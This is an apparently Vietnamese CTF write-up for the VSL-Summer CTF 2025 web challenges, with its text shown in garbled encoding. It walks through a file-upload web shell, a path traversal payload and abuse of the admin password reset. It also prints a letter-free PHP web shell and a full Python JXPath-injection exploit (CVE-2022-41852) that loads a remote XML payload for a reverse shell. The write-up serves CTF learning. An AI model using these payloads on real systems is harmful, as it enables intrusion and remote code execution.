---
title: Writeup VSL-Summer CTF 2025
published: 2025-07-01
description: 'ÄÃ¢y lÃ  wu cá»§a mÃ¬nh Ä‘Ã£ giáº£i Ä‘Æ°á»£c'
image: './image.png'
tags: ["WEB"]
category: 'CTF Writeup'
draft: false 
lang: 'vi'
---
# All Challenge
![alt text](image-1.png)
## 1. Upload File 1
![alt text](image-2.png)
### Liá»‡t kÃª
- Trang má»¥c lá»¥c:
![alt text](image-3.png)
- Tá»›i Ä‘Ã¢y mÃ¬nh sáº½ upload 1 file hÃ¬nh áº£nh chuáº©n vÃ o, sau khi upload xong nÃ³ chuyá»ƒn hÆ°á»›ng Ä‘áº¿n thÃ nh cÃ´ng pháº§n upload
![alt text](image-4.png)
- NÃ³i nhÆ° trÃªn cÃ¡c chá»— nÃ y thÆ°á»ng xáº£y ra lá»— há»•ng upload file mÃ¬nh tiáº¿n hÃ nh vÃ o burpsuite Ä‘á»ƒ giáº£i quyáº¿t thay Ä‘á»•i upload web shell.
![alt text](image-5.png)
- Tá»›i Ä‘Ã¢y mÃ¬nh Ä‘Ã£ bá» qua Ä‘Æ°á»£c pháº§n má»Ÿ rá»™ng vÃ  upload Ä‘Æ°á»£c shell php lÃªn tá»›i Ä‘Ã¢y get content ra thÃ¬ Ä‘Æ°á»£c nhÆ° sau:
![alt text](image-6.png)
- Bypass thÃ nh cÃ´ng thÃ¬ chá»‰nh sá»­a payload xem file flag náº±m Ä‘áº§u ? Sau khi sá»­a Ä‘á»•i lá»‡nh <b>ls</b> Ä‘á»ƒ dÃ² file flag thÃ¬ chÃºng ta nhÃ¬n tháº¥y:
![alt text](image-7.png)
- CÃ¹ng trÃ­ch xuáº¥t flag ta thu Ä‘Æ°á»£c:
![alt text](image-8.png)
-> Flag: <b>VSL{upl04d3d_th3_m4lw4r3_i2nfnvu39fjd}</b>
## Beach Shop 0
- Description: CÃ¡i nÃ³ng cá»§a mÃ¹a hÃ¨ Ä‘Ã£ khiáº¿n @ph4nt0m khÃ´ng chá»‹u ná»•i. Äá»ƒ chá»‘ng láº¡i cÃ¡i nÃ³ng nÃ y, @ph4nt0m Ä‘Ã£ quyáº¿t Ä‘á»‹nh Ä‘i biá»ƒn. TrÆ°á»›c khi ra Ä‘áº¿n biá»ƒn, anh áº¥y Ä‘Ã£ ghÃ© qua cÃ¡c shop online Ä‘á»ƒ mua kÃ­nh bÆ¡i, vÃ  tháº­t tÃ¬nh cá» Ä‘iá»u nÃ y Ä‘Ã£ Ä‘Æ°a anh áº¥y Ä‘áº¿n má»™t chuá»—i lá»— há»•ng nghiÃªm trá»ng trong trang web nÃ y :>
Good luck ae Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c nhiá»u bug nhÆ° @ph4nt0m
Note: Flag náº±m á»Ÿ /flag.txt
- Trang má»¥c lá»¥c: Khi truy cáº­p vÃ o trang web tháº¥y 1 trang web Ä‘áº¹p mÃ¡t máº» vá»›i cÃ¡i nÃ³ng mÃ¹a hÃ¨ 
![alt text](image-9.png)
- Tá»›i Ä‘Ã¢y truy tÃ¬m manh má»‘i á»Ÿ hÃ¬nh áº£nh thÃ¬ phÃ¡t hiá»‡n Ä‘Æ°á»£c Ä‘Æ°á»ng dáº«n : view-source:http://61.14.233.78:5000/images?file=surfboard.jpg
- Theo nhÆ° kinh nghiá»‡m hay lÃ m thÃ¬ tuyáº¿n Ä‘Æ°á»ng file nÃ y dá»… bá»‹ path travelsal vá»›i hint á»Ÿ Ä‘á» bÃ i flag náº±m /flag.txt
- ThÃ¬ payload mÃ¬nh nhÆ° sau: ../../../../../../flag.txt
- Thu Ä‘Æ°á»£c Flag cuá»‘i cÃ¹ng: <b>VSL{b34ch_sh0p4th_tr4v3rs4l_2idmwiq9@39!}</b>
## Watch Store
- Description: MÃ¹a hÃ¨ nÃ y, du lá»‹ch lÃ  Ä‘iá»u hiá»ƒn nhiÃªn. @ph4n10m quyáº¿t Ä‘á»‹nh mua má»™t Ä‘á»“ng há»“ Ä‘á»ƒ cÃ³ thá»ƒ flex cÃ¡c em gÃ¡i khi Ä‘i du lá»‹ch. @ph4n10m ghÃ© thÄƒm má»™t trang web ná»•i tiáº¿ng vá» Ä‘á»“ng há»“. Sá»± tÃ¬nh cá» nÃ y láº¡i Ä‘em Ä‘áº¿n má»™t báº¥t ngá» ná»¯a.
@ph4n10m quyáº¿t Ä‘á»‹nh sáº½ Ä‘á»ƒ báº¥t ngá» nÃ y láº¡i cho báº¡n khÃ¡m phÃ¡
- VÃ  cÃ¢u nÃ y do team ra nÃªn writeup chi tiáº¿t táº¡i Ä‘Ã¢y: https://hackmd.io/@AnhFuck/SkHov-gQge
## Beach Shop - Old Challenge
- Description: Náº¿u báº¡n tháº¥y nÃ³ quen thuá»™c thÃ¬ báº¡n thá»±c sá»± lÃ  má»™t hacker lÃ¢u nÄƒm cá»§a VSL Ä‘áº¥y :3. ChÃºc may máº¯n nhÃ©! (TÃ i khoáº£n test: guest/guest)
- Trang má»¥c lá»¥c:
![alt text](image-10.png)
- Khi truy cáº­p trang chá»§, mÃ¬nh phÃ¡t hiá»‡n cÃ³ tÃ­nh nÄƒng Ä‘Äƒng nháº­p vÃ  Ä‘Äƒng kÃ½. Thá»­ Ä‘Äƒng kÃ½ vá»›i username admin â†’ há»‡ thá»‘ng bÃ¡o tÃ i khoáº£n Ä‘Ã£ tá»“n táº¡i.
![alt text](image-11.png)
- Nháº­n tháº¥y tÃ i khoáº£n admin nÃ y Ä‘Ã£ tá»“n táº¡i vÃ  tÃ´i nhá»› ra challenge nÃ y cÃ³ mÃ£ nguá»“n cá»§a nÄƒm trÆ°á»›c vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c mÃ£ nguá»“n vÃ  phÃ¢n tÃ­ch vÃ  Ä‘i vÃ o khai thÃ¡c.
![alt text](image-12.png)
- á» tuyáº¿n Ä‘Æ°á»ng nÃ y á»Ÿ index trang nÃ³ sáº½ lÆ°u username Ä‘Äƒng nháº­p vÃ o session
![alt text](image-13.png)
- á» tuyáº¿n Ä‘Æ°á»ng nÃ y tá»©c lÃ  khi chÃºng ta truy cáº­p Ä‘Æ°á»£c admin thÃ¬ chÃºng ta sáº½ truy xuáº¥t flag sáº½ hiá»ƒn thá»‹ á»Ÿ profile. BÃ¢y giá» chÃºng ta cÃ¹ng táº­p trung á»Ÿ tuyáº¿n Ä‘Æ°á»ng khÃ´i phá»¥c máº­t kháº©u á»Ÿ tk admin
![alt text](image-14.png)
![alt text](image-15.png)
- á» Ä‘Ã¢y nÃ³ sáº½ Ä‘á»c táº¥t cáº£ cÃ¡c file trong thÆ° má»¥c username/questions
- BÃ¢y giá» má»¥c tiÃªu khÃ´i phá»¥c máº­t kháº©u cá»§a admin thÃ¬ má»¥c tiÃªu pháº£i Ä‘á»c <b>home/admin/questions</b> váº­y thÃ¬ chá»©c nÄƒng Ä‘Äƒng kÃ­ cho phÃ©p Ä‘iá»u Ä‘Ã³
![alt text](image-16.png)
- á» tuyáº¿n Ä‘Æ°á»ng register nÃ y tá»©c khi Ä‘Äƒng kÃ­ náº¿u chÆ°a tá»« khÃ³a password thÃ¬ nÃ³ khÃ´ng cho phÃ©p ngÄƒn cháº·n truy cáº­p password.txt. mÃ¬nh sáº½ ghi file nÃ y vÃ o <b>/home/admin/questions</b> Ä‘á»ƒ tá»« Ä‘Ã³ khi reset mÃ¬nh trá» file nÃ y vÃ  ná»™i dung mÃ¬nh cÅ©ng Ä‘Ã£ biáº¿t.
- Váº­y lÃ m cÃ¡ch nÃ o Ä‘á»ƒ cÃ³ file <b>/home/admin/questions/password.txt</b> thÃ¬ má»¥c tiÃªu lÃ  chÃºng ta cáº§n Ä‘Äƒng kÃ­ 1 username admin/questions vá»›i question answer tá»± Ä‘Äƒng kÃ­
- Sau Ä‘Ã³ vÃ o chá»©c nÄƒng khÃ´i phá»¥c password trÃªn web vá»›i tÃªn admin
![alt text](image-17.png)
![alt text](image-18.png)
- ChÃºng ta Ä‘Ã£ khÃ´i phá»¥c thÃ nh cÃ´ng password tÃ i khoáº£n admin
![alt text](image-19.png)
- BÃ¢y giá» chÃºng ta cÃ¹ng Ä‘Äƒng nháº­p vá»›i tÃ i khoáº£n admin
![alt text](image-20.png)
## brainrot
- Author: d4kw1n. MÃ´ táº£ cá»§a thá»­ thÃ¡ch:
![alt text](image-21.png)
### Liá»‡t kÃª
- Äáº§u tiÃªn chÃºng ta cÃ¹ng truy cáº­p vÃ o trang web tÆ°Æ¡ng á»©ng vá»›i url: http://61.14.233.78:8888
![alt text](image-22.png)
- Táº¡i Ä‘Ã¢y á»Ÿ trang web xuáº¥t hiá»‡n vá»›i nhá»¯ng mÃ´ táº£ mÃ  author Ä‘Æ°a ra nÃ³i vá» nhá»¯ng toÃ¡n há»c kÃ¨m theo pháº§n cÃ³ thá»ƒ upload 1 file lÃªn thÃ¬ Ä‘áº§u tiÃªn tháº¥y upload file mÃ¬nh nghá»‰ Ä‘áº¿n ngay lÃ  upload má»™t hÃ¬nh áº£nh vÃ  thá»±c hiá»‡n RCE nhÆ° thÆ°á»ng lá»‡ nhÆ°ng cuá»™c Ä‘á»i mÃ  cháº¯c cÃ³ gÃ¬ dá»… dÃ£i Ä‘áº¿n váº­y =))). Sau khi upload 1 hÃ¬nh áº£nh thÃ¬ nÃ³ tráº£ vá» nhÆ° sau:
![alt text](image-23.png)
- NÃ³i ráº±ng ko Ä‘Æ°á»£c phÃ©p upload hÃ¬nh áº£nh cÃ³ chá»¯ cÃ¡i tá»©c lÃ  nhá»¯ng: File chá»©a kÃ½ tá»± alphabet (a-zA-Z), khÃ´ng Ä‘Æ°á»£c phÃ©p upload. Sau má»™t há»“i mÃ¬nh cá»© ngá»“i mÃ y mÃ² tÃ¬m payload trÃªn payloadAllTheThing thÃ¬ khÃ´ng cÃ³ gÃ¬ xáº£y ra vÃ¬ má»—i webshell Ä‘á»u cÃ³ kÃ­ tá»± chá»¯ cÃ¡i.
- VÃ  mÃ¬nh nghá»‰ ráº±ng lÃ  háº§u háº¿t cÃ¡c WAF lá»c ráº¥t nhiá»u kÃ½ tá»± cÃ³ sáºµn khiáº¿n viá»‡c khai thÃ¡c trá»Ÿ nÃªn khÃ³ khÄƒn hÆ¡n. VÃ  trong Ä‘Ã³ cÃ¡c CÃ¡c kÃ½ tá»± phá»• biáº¿n bá»‹ cháº·n hoáº·c lá»c lÃ  a-zA-Z. LÃºc Ä‘áº§u Ä‘Ã£ cÃ³ nhá»¯ng shell khÃ´ng pháº£i chá»¯ vÃ  sá»‘ nhÆ°ng nhá»¯ng shell tÃ´i tháº¥y Ä‘á»u cÃ³ má»™t Ä‘iá»ƒm chung lÃ  chÃºng cáº§n dáº¥u ngoáº·c kÃ©p Ä‘á»ƒ táº¡o thÃ nh má»™t chuá»—i má»™t láº§n Ä‘á»ƒ táº¡o ra cÃ¡c chá»¯ cÃ¡i tá»« chuá»—i Ä‘Ã³.
- Sau quÃ¡ trÃ¬nh tÃ¬m kiáº¿m má»™t sá»‘ case táº§m khoáº£ng 2-3h Ä‘á»“ng há»“ tÃ´i phÃ¡t hiá»‡n Ä‘Æ°á»£c 1 shell cÃ³ thá»ƒ bao gá»“m toÃ n kÃ­ tá»± chá»¯ sá»‘ vÃ  kÃ­ tá»± Ä‘áº·c biá»‡t khÃ´ng cÃ³ chá»¯ cÃ¡i vÃ  cÃ³ thá»ƒ vÆ°á»£t qua bá»™ lá»c cá»§a server.
### Khai thÃ¡c
```php
<?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```
- á» payload nÃ y theo nhÆ° tÃ¬m hiá»ƒu cá»§a mÃ¬nh vÃ  cÃ³ sá»± há»— trá»£ cá»§a chat gpt thÃ¬ mÃ¬nh Ä‘Æ°á»£c hiá»ƒu lÃ  payload nÃ y nÃ³ sá»­ dá»¥ng xÃ¢y dá»±ng tÃªn hÃ m "system" thÃ´ng qua phÃ©p XOR vÃ  toÃ¡n tá»­ Ä‘áº·c biá»‡t sau Ä‘Ã³ thá»±c thi lá»‡nh tá»« $_GET[1] mÃ  khÃ´ng gá»i trá»±c tiáº¿p tá»« khÃ³a bá»‹ cáº¥m nÃ o. Mnguoi cÃ³ thá»ƒ tÃ¬m hiá»ƒu payload trÃªn á»Ÿ gg Ä‘á»ƒ hiá»ƒu rÃµ hÆ¡n ná»¯a.
- Rá»’i bÃ¢y giá» Ä‘á»ƒ cháº¯c cháº¯n hÆ¡n mÃ¬nh sáº½ kiá»ƒm tra chÃºng xem cÃ³ kÃ­ tá»± chá»¯ cÃ¡i ko.
![alt text](image-24.png)
- Káº¿t quáº£ Ä‘áº§u ra khÃ´ng hiá»ƒn thá»‹ chá»¯ cÃ¡i chá»©ng tá» mÃ¬nh Ä‘Ã£ vÆ°á»£t qua Ä‘iá»u Ä‘Ã³ vÃ  á»Ÿ pháº§n upload nÃ y nÃ³ khÃ´ng kiá»ƒm tra Ä‘á»‹nh dáº¡ng file upload nÃªn mÃ¬nh sáº½ lÆ°u payload trÃªn Ä‘á»ƒ upload file php.
![alt text](image-25.png)
- ChÃºng ta Ä‘Ã£ vÆ°á»£t qua Ä‘Æ°á»£c bá»™ lá»c bÃ¢y giá» cÃ³ thá»ƒ RCE
![alt text](image-26.png)
- Xáº£y ra lá»—i Array to string conversion vÃ  sau khi tÃ¬m hiá»ƒu chÃºng ta cÃ³ thá»ƒ Ä‘Æ°á»£c kháº¯c phá»¥c báº±ng cÃ¡ch thÃªm <b>@</b> vÃ o pháº§n truy váº¥n mong muá»‘n thá»±c hiá»‡n Ã©p kiá»ƒu.
- Payload cuá»‘i cÃ¹ng:
```php
<?=@$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```
![alt text](image-27.png)
- Rá»“i thá»±c hiá»ƒn RCE vá»›i param payload ?0=system&1=id thá»±c thi id thÃ´ng qua system á»Ÿ param 1
![alt text](image-28.png)
- Rá»“i bÃ¢y giá» má»¥c tiÃªu cá» á»Ÿ Ä‘Ã¢u cÃ¹ng thá»±c hiá»‡n ls / Ä‘á»ƒ xem file cá».
![alt text](image-29.png)
![alt text](image-30.png)
-> Flag: <b>VSL{7e56ae1036160bceaedde8032663810308bd57c1}</b>
## TechStore
![alt text](image-31.png)
- á» challenge nÃ y sau khi káº¿t thÃºc giáº£i mÃ¬nh má»›i giáº£i ra vÃ¬ trong quÃ¡ trÃ¬nh giáº£i diá»…n ra mÃ¬nh Ä‘Ã£ Ä‘i sai hÆ°á»›ng.
- Äáº§u tiÃªn chÃºng ta cÃ¹ng truy cáº­p trang web:
### Liá»‡t kÃª
![alt text](image-32.png)
- Khi truy cáº­p vÃ o trang web trang hiá»ƒn thá»‹ má»™t trang web bÃ¡n laptop trá»±c tuyáº¿n vá»›i 2 chá»©c nÄƒng Ä‘Äƒng kÃ­ vÃ  Ä‘Äƒng nháº­p tá»›i Ä‘Ã¢y mÃ¬nh thÆ° Ä‘Äƒng kÃ­ má»™t tÃ i khoáº£n vÃ  Ä‘Äƒng nháº­p xem nÃ³ diá»…n ra nhÆ° tháº¿ nÃ o?
- Sau khi Ä‘Äƒng nháº­p xong nÃ³ chuyá»ƒn hÆ°á»›ng Ä‘áº¿n má»™t profile cÃ¡ nhÃ¢n cá»§a mÃ¬nh:
![alt text](image-33.png)
- á» Ä‘Ã¢y phÃ­a dÆ°á»›i mÃ¬nh cÃ³ tháº¥y chá»‰nh sá»­a profile vá»›i chá»©c nÄƒng upload avatar thÃ¬ mÃ¬nh nghÄ© cÃ³ láº½ nÃ o cÃ³ lá»— há»•ng upload file nhÆ°ng khÃ´ng sau má»i láº§n thá»­ thÃ¬ nÃ³ chá»‰ dowload ná»™i dung vá» mÃ¡y?. Sau khi upload hÃ¬nh áº£nh nÃ³ sáº½ tráº£ vá» nhÆ° sau:
![alt text](image-35.png)
- Äá» bÃ i cÃ³ cho mÃ£ nguá»“n chÃºng ta cÃ¹ng phÃ¢n tÃ­ch mÃ£ nguá»“n Ä‘á»ƒ hiá»ƒu sÃ¢u hÆ¡n vá» challenge
- MÃ£ nguá»“n ráº¥t dÃ i nÃªn sau vÃ i tiáº¿ng ngá»“i Ä‘á»c phÃ¢n tÃ­ch vá»›i sá»± há»— trá»£ chatgpt ná»¯a nÃªn mÃ¬nh sáº½ táº­p trung cÃ¡c ná»™i dung lá»— há»•ng chÃ­nh. á» Ä‘Ã¢y sáº½ táº­p trung vÃ o tuyáº¿n Avatar cá»§a user
- á» Controller UserController.
![alt text](image-37.png)
- Khi tÃ´i Ä‘á»c tá»›i Ä‘Ã¢y tÃ´i tháº¥y JXPath tÃ´i Ä‘Ã£ tá»± há»c JXPath lÃ  gÃ¬ sau quÃ¡ trÃ¬nh tÃ¬m thÃ¬ á»Ÿ source code author cÃ³ Ä‘á»ƒ má»™t file pom.xml
![alt text](image-38.png)
- ThÃ¬ phÃ¡t hiá»‡n Ä‘Æ°á»£c Ä‘Ã¢y lÃ  má»™t CVE vá» JXPath Injection  á»Ÿ mÃ£ trÃªn á»Ÿ pháº§n <b>typeX</b> nÃ³ khÃ´ng Ä‘Æ°á»£c kiáº¿m soÃ¡t Ä‘áº§u vÃ o báº±ng cÃ¡ch Ä‘Ã³ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Injection vÃ o tuyáº¿n typeX nÃ y Ä‘á»ƒ kÃ­ch hoáº¡t thÃ´ng qua giÃ¡ trá»‹ getValue váº­y bÃ¢y giá» lÃ m sao má»›i biáº¿t injection typeX nÃ y á»Ÿ Ä‘Ã¢u.
![alt text](image-39.png)
- ThÃ¬ á»Ÿ Model avatar cÃ³ 2 thuá»™c tÃ­nh getter vÃ  setter cá»§a typeX nÃ y chÃºng ta cÃ³ thá»ƒ truyá»ƒn chÃºng vÃ o tuyáº¿n Ä‘Æ°á»ng Avatar nÃ y thÃ´ng qua <b>/api/avatars/{avatarId}</b>
- Tháº­t may máº¯n lÃ  á»Ÿ tuyáº¿n Ä‘Æ°á»ng nÃ y cÃ³ chá»©c nÄƒng put
![alt text](image-40.png)
- ChÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ cáº­p nháº­t typeX thÃ´ng qua tuyáº¿n Ä‘Æ°á»ng nÃ y vÃ  sau khi cáº­p nháº­t xong thÃ¬ chÃºng ta ta cÃ³ thá»ƒ post á»Ÿ tuyáº¿n nÃ y Ä‘á»ƒ kÃ­ch hoáº¡t typeX 
![alt text](image-41.png)
- Rá»“i sau khi phÃ¢n tÃ­ch cá»¥ thá»ƒ nhÆ° trÃªn cÃ³ thá»ƒ tÃ³m táº¯t cÃ¡c bÆ°á»›c khai thÃ¡c:
1. ÄÄƒng kÃ­ 1 tÃ i khoáº£n upload 1 hÃ¬nh áº£nh vÃ  upload 1 file hÃ¬nh áº£nh láº¥y avatar_id
2. ÄÃ£ cÃ³ avatar_id cÃ³ thá»ƒ sá»­ dá»¥ng <b>PUT /api/avatar/avartar_id</b> Ä‘á»ƒ cáº­p nháº­t biáº¿n typeX 
3. Sau khi cáº­p nháº­t xong chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng <b>POST /api/avatars/{avatarId}/set-primary</b> Ä‘á»ƒ kÃ­ch hoáº¡t typeX tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i táº£i trá»ng Ä‘Æ°a vÃ o.
- Sau khi Ä‘Ã£ biáº¿t Ä‘Æ°á»£c Ä‘Ã¢y lÃ  má»™t <b>CVE JXPath</b> tÃ´i Ä‘Ã£ tÃ¬m tháº¥y Ä‘Æ°á»£c táº£i trá»ng thÃ´ng qua trang github <a href="https://github.com/Warxim/CVE-2022-41852.git">CVE-2022-41852</a> 
### Khai thÃ¡c
- Äáº§u tiÃªn tÃ´i sáº½ lÆ°u má»™t táº£i trá»ng RCE file XML lÆ°u á»Ÿ dáº¡ng raw Ä‘á»ƒ inject vÃ o biáº¿n typeX
<a href="https://gist.githubusercontent.com/Capt-Webk5/11d48a792046d7a19eb270768ca4f6ec/raw/40ded203fc77c32fc3ddb05196325e7079ff3e53/RCE.xml"> Payload XML Táº¡i ÄÃ¢y </a> 
- TÃ´i sáº½ thiáº¿t láº­p má»™t con ngrok tcp
![alt text](image-43.png)
- Tá»›i Ä‘Ã¢y tÃ´i sáº½ thiáº¿t láº­p má»™t trÃ¬nh láº¯ng nghe nc Ä‘á»ƒ nháº­n revershell 
![alt text](image-44.png)
- Sau khi setup háº¿t thÃ¬ chÃºng ta cÃ¹ng kick hoáº¡t typeX. Tá»›i Ä‘Ã¢y Ä‘á»… dá»… quÃ¡ trÃ¬nh tá»± Ä‘á»™ng hÃ³a tÃ´i Ä‘Ã£ viáº¿t má»™t táº­p lá»‡nh python vá»›i cÃ¹ng sá»± há»— trá»£ cá»§a chatGPT.

```python
import requests
import re
import sys
import time

URL_CHALLENGE = "http://61.14.233.78:8082"
username = "vanphuc"
password = "vanphuc"
AVATAR_FILE_UPLOAD = "solve1.png"
PAYLOAD_RCE_XML = "https://gist.githubusercontent.com/Capt-Webk5/11d48a792046d7a19eb270768ca4f6ec/raw/40ded203fc77c32fc3ddb05196325e7079ff3e53/RCE.xml"
session = requests.session()
RCE_PAYLOAD = f'org.springframework.context.support.ClassPathXmlApplicationContext.new("{PAYLOAD_RCE_XML}")'

def get_csrf_token(path="/login"):
    r = session.get(URL_CHALLENGE + path)
    token = re.search(r'name="_csrf" value="([^"]+)"', r.text)
    if token:
        return token.group(1)
    meta = re.search(r'<meta name="_csrf" content="([^"]+)"', r.text)
    if meta:
        return meta.group(1)
    print("[x] CSRF Token Not Found!")
    sys.exit(1)

# Login
def login():
    csrf = get_csrf_token("/login")
    print("[+] CSRF Token (Login): ", csrf)
    data = {
        "username": username,
        "password": password,
        "_csrf": csrf
    }
    r = session.post(URL_CHALLENGE + "/login", data=data, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Loggin SuccessFully")
    else:
        print("[!] Login Failed")
        sys.exit(1)

# Upload HÃ¬nh áº£nh
def upload_avartar():
    csrf = get_csrf_token("/avatar-manager")
    print("[+] CSRF Token Avatar Manager: ", csrf)
    with open(AVATAR_FILE_UPLOAD, "rb") as f:
        files = {"file": (AVATAR_FILE_UPLOAD, f, "image/png")}
        headers = {
            "X-CSRF-TOKEN": csrf,
            "X-Requested-With": "XMLHttpRequest"
        }
        r = session.post(URL_CHALLENGE + "/api/upload-file", files=files, headers=headers)
        try:
            res = r.json()
        except Exception as e:
            print("[-] Upload Avartar Failed: ", str(e))
            print(r.text)
            sys.exit(1)
        if res.get("success"):
            avatar_id = res["avatarId"]
            print("[+] Upload Avatar ID: ", avatar_id)
            return avatar_id
        else:
            print("[-] Upload failed:", res.get("message"))
            sys.exit(1)

def injection_payload_trigger(avatar_id, payload):
    csrf = get_csrf_token("/avatar-manager")

    # ÄÆ°a payload vÃ o typeX thÃ´ng qua PUT
    URL_PUT = f"{URL_CHALLENGE}/api/avatars/{avatar_id}"
    data = {
        "typeX": payload,
        "isPrimary" : True
    }
    headers = {
        "Content-Type": "application/json",
        "X-CSRF-TOKEN": csrf,
        "X-Requested-With": "XMLHttpRequest"
    }
    r = session.put(URL_PUT, json=data, headers=headers)
    print("[+] Payload Injection SuccessFully")

    # Thá»±c hiá»‡n trigger
    URL_TRIGGER = f"{URL_CHALLENGE}/api/avatars/{avatar_id}/set-primary"
    r = session.post(URL_TRIGGER, headers=headers)
    try:
        res = r.sjon()
    except Exception as e:
        print("[-] Trigger Failed!", str(e))
        print(r.text)
        return
    print("[*] Response Return: ", res)
    if res.get("success") and "mainAvatarName" in res:
        print("[ğŸ¯] RESULT:", res["mainAvatarName"])
    else:
        print("[-] Trigger Executed")

if __name__ == "__main__":
    print("[+] Login NÃ o:....")
    login()

    print("[+] Upload Avatar")
    avatar_id = upload_avartar()
    time.sleep(2)

    print("\n[+] Injection RCE Payload And Trigger RCE")
    injection_payload_trigger(avatar_id, RCE_PAYLOAD)
```
- Sau khi tÃ´i thá»±c hiá»‡n cháº¡y mÃ£ python trÃªn. vÃ  kiá»ƒm tra trÃ¬nh láº¯ng nghe
![alt text](image-45.png)
- TÃ´i Ä‘Ã£ thÃ nh cÃ´ng bypass vÃ  cÃ³ thá»ƒ chiáº¿m quyá»n 
![alt text](image-46.png)
- Tá»›i Ä‘Ã¢y cÃ¹ng thá»±c hiá»‡n ls / xem cÃ¡c thÆ° má»¥c 
![alt text](image-47.png)
- Thá»±c hiá»‡n truy xuáº¥t FLAG: 
![alt text](image-48.png)
-> Flag : <b>VSL{JXP4TH_RC3_VULN3RABIL1TY_t0_g3t_th3_fl4g_222kf0m@@3!%m}</b>